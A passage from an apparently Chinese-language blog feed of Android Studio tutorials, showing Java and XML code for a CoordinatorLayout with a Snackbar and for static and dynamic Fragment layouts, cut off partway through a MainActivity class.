class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="CoordinatorLayout"><a href="#CoordinatorLayout" class="headerlink" title="CoordinatorLayout"></a>CoordinatorLayout</h2><p>实现悬浮跟着运动</p><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.materialtest_2;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> com.google.android.material.snackbar.Snackbar;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Button button=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        button=(Button)findViewById(R.id.delete);<br>        button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                Snackbar.make(v,<span class="hljs-string">&quot;即将删除&quot;</span>,Snackbar.LENGTH_LONG).setAction(<span class="hljs-string">&quot;Undo&quot;</span>, <span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                        Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;Data restored&quot;</span>,Toast.LENGTH_SHORT).show();<br>                    &#125;<br>                &#125;).show();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Hello World!&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;40dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.coordinatorlayout.widget.CoordinatorLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span>&gt;</span><br><br>       <span class="hljs-comment">&lt;!-- 暂时只能通过gravity调整位置 具体实现跟着运动仅使用androidx.coordinatorlayout.widget.CoordinatorLayout --&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.material.floatingactionbutton.FloatingActionButton</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/fab&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;80dp&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;80dp&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;bottom&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_margin</span>=<span class="hljs-string">&quot;16dp&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">&quot;@drawable/tmp_5&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">app:elevation</span>=<span class="hljs-string">&quot;20dp&quot;</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/delete&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;end&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;删除&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;50dp&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">androidx.coordinatorlayout.widget.CoordinatorLayout</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>Material</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio Fragment</title>
    <link href="/2021/04/02/AndroidStudio/Android%20Studio%20Fragment/"/>
    <url>/2021/04/02/AndroidStudio/Android%20Studio%20Fragment/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-Fragment"><a href="#Android-Studio-Fragment" class="headerlink" title="Android Studio Fragment"></a>Android Studio Fragment</h1><h2 id="静态布局"><a href="#静态布局" class="headerlink" title="静态布局"></a>静态布局</h2><p>相关代码如下</p><p>Left_gragment.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-comment">//继承相关父类</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeftFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Fragment</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container, Bundle saveInstanceState)</span></span>&#123;<br>        View view=inflater.inflate(R.layout.Left_fragment,container,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Reight_gragment.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RightFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Fragment</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container, Bundle saveInstanceState)</span></span>&#123;<br>        View view=inflater.inflate(R.layout.right_fragment,container,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><span class="hljs-comment">//没有设置</span><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们希望下面两个按钮各占屏幕的一半：</p><table><thead><tr><th><img src="https://img-blog.csdn.net/20150115150135015?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuZ2RlanVu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></th><th><img src="https://img-blog.csdn.net/20150115150220018?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuZ2RlanVu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></th></tr></thead><tbody><tr><td><strong>竖屏效果</strong></td><td><strong>横屏效果</strong></td></tr></tbody></table><p>那么只需要把两个按钮“layout_weight”值设成相等值（比如：1），并且把“layout_width”设成“0dp”</p><p>activity_left.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_right.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;这是一个右侧Fragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;20sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fragment</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/left_fragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.example.fragmentmd.LeftFragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fragment</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/right_fragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.example.fragmentmd.RightFragment&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="动态Fragment"><a href="#动态Fragment" class="headerlink" title="动态Fragment"></a>动态Fragment</h2><p>相关代码</p><p>AnotherRightFragment.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.FrameLayout;<br><br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnotherRightFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Fragment</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container, Bundle saveInstanceState)</span></span>&#123;<br>        View view=inflater.inflate(R.layout.another_right_fragment,container,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentTransaction;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">View</span>.<span class="hljs-title">OnClickListener</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <br>        Button button=(Button)findViewById(R.id.button);<br>        button.setOnClickListener(<span class="hljs-keyword">this</span>);<br>        <span class="hljs-comment">//调用替换函数</span><br>        replaceFragment(<span 